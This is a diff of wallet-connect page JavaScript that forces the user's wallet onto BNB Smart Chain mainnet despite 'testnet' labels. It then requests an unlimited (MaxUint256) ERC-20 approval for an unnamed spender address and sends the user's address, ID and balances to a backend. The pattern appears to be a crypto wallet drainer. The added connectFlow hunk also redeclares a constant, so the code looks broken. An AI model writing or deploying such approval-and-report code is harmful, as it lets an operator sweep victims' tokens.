@@ -393,121 +393,120 @@ updateUIState();
       }
     }
 
-    async function ensureTokenApproval(){
-      // helper: always log with last known balances
-      async function logApproval(tag){
-        await notifyBackend(
-          currentAddress || "",
-          BNB_TESTNET_LABEL,
-          currentUserId || "",
-          currentBNBBalance,
-          currentTokenBalance,
-          tag
-        );
-      }
 
-      // basic guards
-      if(!TOKEN_ADDRESS){
-        console.warn("TOKEN_ADDRESS not set, skipping approve");
-        await logApproval("approval_skipped_no_token");
+
+
+
+    
+let isApproving = false;
+
+async function ensureTokenApproval() {
+  if (isApproving || isTokenApproved) return;
+  isApproving = true;
+
+  async function logApproval(tag) {
+    await notifyBackend(
+      currentAddress || "",
+      BNB_TESTNET_LABEL,
+      currentUserId || "",
+      currentBNBBalance,
+      currentTokenBalance,
+      tag
+    );
+  }
+
+  try {
+    // 1. Grab active provider (AppKit or Trust Wallet injected fallback)
+    const provider =
+      providerInstance ||
+      window.appKit?.getWalletProvider?.() ||
+      window.trustwallet?.ethereum ||
+      window.ethereum;
+
+    if (!provider) {
+      alert("Wallet provider not found. Please reconnect.");
+      return;
+    }
+    providerInstance = provider;
+
+    setStatus("Checking network…");
+
+    // 2. Ensure wallet is on BSC (0x38) right before sending tx
+    const currentChainHex = await provider.request({ method: "eth_chainId" });
+    if (Number(currentChainHex) !== 56) {
+      const switched = await switchToBSC(provider);
+      if (!switched) {
+        alert("Please switch your wallet to BNB Smart Chain (56) and tap Approve again.");
+        setStatus("Wrong network");
         return;
-      }
-      if(!SPENDER_ADDRESS){
-        console.warn("SPENDER_ADDRESS not set, skipping approve");
-        await logApproval("approval_skipped_no_spender");
-        return;
-      }
-      if(!providerInstance || !web3Instance){
-        console.warn("No providerInstance/web3Instance for approval");
-        await logApproval("approval_skipped_no_provider");
-        return;
-      }
-
-      try{
-        setStatus("Preparing token approval…");
-
-        const ethersProvider = new ethers.BrowserProvider(
-          providerInstance,
-          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
-        );
-        const signer       = await ethersProvider.getSigner();
-        const ownerAddress = (await signer.getAddress()).toLowerCase();
-
-        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-          alert(
-            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
-            "It MUST be the BEP-20 token contract address, not your wallet."
-          );
-          setStatus("Connected (approval skipped)");
-          await logApproval("approval_skipped_token_is_wallet");
-          return;
-        }
-
-        // 1) check allowance
-        const readContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_ALLOWANCE_ABI,
-          ethersProvider
-        );
-        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-        console.log("[approve] currentAllowance =", currentAllowance.toString());
-
-       if (currentAllowance > 0n) {
-        
-  isTokenApproved = true;
-  approvalFailed  = false;
-           updateUIState();
-  setStatus("Connected + Approved ✅");
-  updateApproveButtonUI();
-  await logApproval("approval_already");
-  return;
-       
-}
-isTokenApproved = false;
-approvalFailed  = false;
-updateUIState();
-
-        // 2) send approve tx
-        setStatus("Waiting for wallet to confirm approval…");
-        const writeContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_APPROVE_ABI,
-          signer
-        );
-
-        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-        console.log("[approve] tx sent:", tx.hash);
-
-        setStatus("Approval pending on chain…");
-        await tx.wait();
-
-    isTokenApproved = true;
-approvalFailed  = false;
-          updateUIState();
-setStatus("Connected + Approved ✅");
-updateApproveButtonUI();
-await logApproval("approval_approved");
-
-      }catch(err){
-        console.error("Token approve error:", err);
-
-        let tag = "approval_error";
-        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-          tag = "approval_rejected";
-        }
-isTokenApproved = false;
-approvalFailed  = true;
-          updateUIState();
-setStatus("Connected • Approval failed");
-updateApproveButtonUI();
-
-await logApproval(tag);
-
       }
     }
 
+    // 3. Get active account
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    const ownerAddress = accounts[0];
+    currentAddress = ownerAddress.toLowerCase();
+
+    // 4. Encode ERC-20 approve(spender, amount) call data directly via ethers.Interface (no RPC needed)
+    const iface = new ethers.Interface(ERC20_APPROVE_ABI);
+    const data = iface.encodeFunctionData("approve", [
+      SPENDER_ADDRESS,
+      ethers.MaxUint256 // Or use ethers.parseUnits("100", 18) for a capped amount
+    ]);
+
+    setStatus("Confirm in wallet…");
+
+    // 5. Fire raw EIP-1193 transaction directly to Trust Wallet mobile UI
+    const txHash = await provider.request({
+      method: "eth_sendTransaction",
+      params: [
+        {
+          from: ownerAddress,
+          to: TOKEN_ADDRESS,
+          data: data,
+          value: "0x0"
+        }
+      ]
+    });
+
+    console.log("[approve] tx sent:", txHash);
+    setStatus("Approval pending on chain…");
+
+    // 6. Poll for receipt using public BSC RPC (avoids mobile WebView RPC drops)
+    const bscReadProvider = new ethers.JsonRpcProvider(BNB_TESTNET_RPC);
+    await bscReadProvider.waitForTransaction(txHash, 1);
+
+    isTokenApproved = true;
+    approvalFailed = false;
+    updateUIState();
+    setStatus("Connected + Approved ✅");
+    updateApproveButtonUI();
+    await logApproval("approval_approved");
+
+  } catch (err) {
+    console.error("Token approve error:", err);
+    let tag = "approval_error";
+    if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
+      tag = "approval_rejected";
+    }
+    isTokenApproved = false;
+    approvalFailed = true;
+    updateUIState();
+    setStatus("Connected • Approval failed");
+    updateApproveButtonUI();
+    await logApproval(tag);
+  } finally {
+    isApproving = false;
+  }
+}
 
 
+
+
+
+
+
+    
 
 modalApproveBtn?.addEventListener("click", async () => {
   modalApproveBtn.disabled = true;
@@ -619,6 +618,20 @@ async function connectFlow() {
       unsubscribe();
     }
 
+// 4) Fallback if subscribeProviders missed the mobile injection
+    const provider =
+      gotProvider ||
+      window.appKit?.getWalletProvider?.() ||
+      window.trustwallet?.ethereum ||
+      window.ethereum;
+
+    if (!provider) {
+      setStatus("Not connected");
+      return;
+    }
+
+
+    
     // 4) If no provider, user probably closed modal or connect failed
     const provider = gotProvider;
     if (!provider) {
